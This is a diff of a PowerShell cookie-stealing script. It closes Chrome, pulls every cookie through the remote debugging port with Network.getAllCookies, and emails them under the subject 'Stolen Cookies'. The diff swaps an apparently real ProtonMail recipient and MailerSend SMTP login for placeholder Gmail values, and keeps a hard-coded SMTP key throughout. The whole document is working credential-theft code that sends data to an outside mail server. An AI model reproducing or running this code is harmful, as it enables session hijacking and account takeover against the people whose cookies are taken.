@@ -1,5 +1,5 @@
 # Parameters
-$toMail = "nielsvermeiren1@proton.me"
+$toMail = "remotemail@gmail.com"
 $remoteDebuggingPort = 9222
 
 # Quit chrome function
@@ -66,7 +66,6 @@ $Message = '{"id": 1,"method":"Network.getAllCookies"}'
 Write-Host "`nObtain all cookies.."
 $response = SendReceiveWebSocketMessage -WebSocketUrl $url_capture[-1] -Message $Message
 
-
 # Quit Chrome
 Write-Host "Close Chrome.."
 quitx
@@ -82,8 +81,8 @@ $cookies = Get-Content $outputFile -Raw
 Write-Host "Send cookies to mail:" $toMail
 $cookies = Get-Content $outputFile -Raw 
 $smtpKey = ConvertTo-SecureString "No9KqH4Yruua7jOP" -AsPlainText -Force
-$smtpCredential = New-Object System.Management.Automation.PSCredential ("MS_F9KmrP@trial-pq3enl6wkzr42vwr.mlsender.net", $smtpKey)
-Send-MailMessage -From "MS_F9KmrP@trial-pq3enl6wkzr42vwr.mlsender.net" -To $toMail -Subject "Stolen Cookies"  -SmtpServer "smtp.mailersend.net" -UseSsl -Credential $smtpCredential -body $cookies -Port 587 
+$smtpCredential = New-Object System.Management.Automation.PSCredential ("SMTP_Password", $smtpKey)
+Send-MailMessage -From "fromsmtpmail@gmail.com" -To $toMail -Subject "Stolen Cookies"  -SmtpServer "smtp.gmail.com" -UseSsl -Credential $smtpCredential -body $cookies -Port 587 
 
 # Success + cleaning
 Write-Host "`n=> Mail successfuly sent!"
